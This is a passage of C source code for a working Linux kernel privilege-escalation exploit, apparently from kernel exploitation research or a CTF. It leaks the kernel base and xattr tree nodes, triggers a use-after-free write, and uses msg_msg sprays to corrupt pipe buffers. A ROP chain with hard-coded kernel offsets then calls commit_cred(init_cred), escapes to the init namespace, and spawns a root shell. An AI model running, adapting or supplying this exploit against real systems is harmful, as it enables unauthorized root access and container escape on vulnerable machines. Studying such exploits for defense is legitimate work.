	for(int i=0; i < 0x4000/(0x40/0x8); i+=0x40/0x8)
	{
		// printf("check %d and value is %d\n",0x17+i, leaks[0x17 + i]);
		if(leaks[0x17 + i] == 0x59 && leaks[0x14 + i] && leaks[0x15 + i] && leaks[0x16 + i] && leaks[0x18 + i])
		{
			nodes[nodes_cnt].xattr.lchild = leaks[0x14 + i];
			nodes[nodes_cnt].xattr.rchild = leaks[0x15 + i];
			nodes[nodes_cnt].xattr.nameptr = leaks[0x16 + i];
			nodes[nodes_cnt].fname_idx = leaks[0x18 + i];
			nodes_cnt++;
		}
	}

	printf("[*] total leak cnts: %d\n", nodes_cnt);

	if(nodes_cnt < 5)
	{
		printf("[-] fail on get enough xattr node info, cleanup it\n");
		cleanup();
		return -1;
	}
	if(kbase == 0)
	{
		printf("[-] fail on get kbase, cleanup it\n");
		cleanup();
		return -1;
	}

	printf("[+] success, leak xattr and kbase\n");

	cleanup_cg_192();

	passer = 1;

retry_1bit_off:
	if (!fork()) {
		trigger_uaf_write(pip1, pip2, 0);
	}
	generate_fake_rbtree(pip1, pip2, nodes[nodes_front].fname_idx, nodes[nodes_front].xattr.lchild + 1, 
									 nodes[nodes_front].xattr.nameptr, nodes[nodes_front].xattr.rchild, nodes[nodes_front].xattr.rchild - 0x18); // actually, lnode == root because of remove_xattr()

	char file_name[FILENAME_LEN];
	snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, nodes[nodes_front].fname_idx);

	char value_name[XATTR_VALUE_CG_8K] = {0, };
    char attribute_name[XATTR_VALUE_CG_8K];

	if(remove_xattr(file_name, "security.attr") < 0)
	{
		printf("[-] fail on remove_xattr, cleanup it\n");
		cleanup2(nodes[nodes_front].fname_idx);
		nodes_front++;
		passer = 0;
		goto retry_1bit_off;
	}

	int pipe_fd[0x200][2];
	for(int i=0; i<0x200; i++)
	{
		if(pipe(pipe_fd[i]) < 0)
			perror("pipe");
		if(fcntl(pipe_fd[i][1], F_SETPIPE_SZ, PAGE_SIZE) < 0)
			perror("fcntl");
	}

	printf("[+] pipe alloc fin\n");

	snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-", 1);
	remove_xattr_any(file_name, attribute_name);
	
	for(int i=prefix_spray_cnt + FIRST_SPRAY_SZ; i < prefix_spray_cnt + THIRD_SPRAY_SZ; i++)
	{
		snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-", 5);
		remove_xattr_any(file_name, attribute_name);
	}

	spray_msgmsg_for_overwrite_pipe_buffer(0x1000 + 0x40, 0x300, 0x0, 0x0, 0x0);

	for(int i=0; i<0x200; i++)
		write(pipe_fd[i][1], "12341234", 8);

	uint64_t vmemmap_base = (read_msgmsg_for_leak_vmemmap_base(0x1000 + 0x40, 0x300) >> 28) << 28;
	uint64_t kheap_base = ((((nodes[nodes_front].xattr.lchild - 0x6000000) >> 28) - 0x10) << 28);
	uint64_t longjump_victim_address = kbase + 0x2c51a40;

	printf("[*] page_offset_base: 0x%llx\n", kheap_base);
	printf("[*] vmemmap base: 0x%llx\n", vmemmap_base);
	printf("[*] longjump victim address: 0x%llx\n", longjump_victim_address);
	if(vmemmap_base == 0)
	{
		printf("[-] fail on get vmemmap_base, cleanup it");
		cleanup();
		return -1;
	}

	uint64_t wakeup_long64 = kbase + 0x12c291;

	spray_msgmsg_for_overwrite_pipe_buffer(0x1000 + 0x40, 0x300,
		virt_to_page(longjump_victim_address & (~0xfff), kheap_base, vmemmap_base), nodes[nodes_front].xattr.nameptr, wakeup_long64
	);

	uint64_t init_cred = kbase + 0x2c72d60;
	uint64_t commit_cred = kbase + 0x001f5520;
	uint64_t prepare_kernel_cred = kbase + 0x001f57d0;
	uint64_t ret_from_fork = kbase + 0x10d430;
	uint64_t msleep = kbase + 0x271300;

	uint64_t find_task_by_vpid = kbase + 0x1e8d60;
	uint64_t switch_task_namespaces = kbase + 0x1f31c0;
	uint64_t set_memory_x = kbase + 0x001551f0;

	uint64_t init_nsproxy = kbase + 0x2c72880;

	uint64_t ret = kbase + 0x5a1;

	// wakeup_long64 
	uint64_t longjump[] = {
		0x0, // rbp
		0x1, // rsi
		longjump_victim_address & (~0xfff), // rdi
		0x0, // rbx
		ret, // rip -> ret
		longjump_victim_address + 0x8*6, // rsp -> stack pivot to longjump victim address
		
		set_memory_x, 

		longjump_victim_address + 0x8*0x18, // pop rdi; ret;
		init_cred,
		commit_cred, // commit_cred(init_cred);

		longjump_victim_address + 0x8*0x18, // pop rdi; ret;
		1,
		find_task_by_vpid, // find_task_by_vpid(1)
		
		longjump_victim_address + 0x8*0x1a, // mov rdi, rax; ret;

		longjump_victim_address + 0x8*0x19, // pop rsi; ret;
		init_nsproxy,
		switch_task_namespaces, // switch_task_namespaces(task, init_nsproxy)

		longjump_victim_address + 0x8*0x1b, // swapgs; iretq;
		get_shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss, 
		0x0, // 23

		0xc35f, // pop rdi; ret -> idx: 0x18
		0xc35e, // pop rsi; ret
		0xc3c78948, // mov rdi, rax; ret
		0xcf48f8010f, // swapgs; iretq;
	};

	printf("[+] target: 0x%llx\n", nodes[nodes_front].xattr.nameptr);

	for(int i=0; i<0x200; i++)
		write(pipe_fd[i][1], ((char *)&longjump - (longjump_victim_address&0xfff)), (longjump_victim_address&0xfff) + sizeof(longjump));

	signal(SIGSEGV, get_shell);

	for(int i=0; i<0x200; i++)
	{
		close(pipe_fd[i][0]);
		close(pipe_fd[i][1]);
	}

	while(1);
}


int main(int argc, char *argv[])
{
	system("ulimit -n 4096");
	usleep_time = atoi("5000000");
	for(int i=0; i<0x100; i++)
		run();
}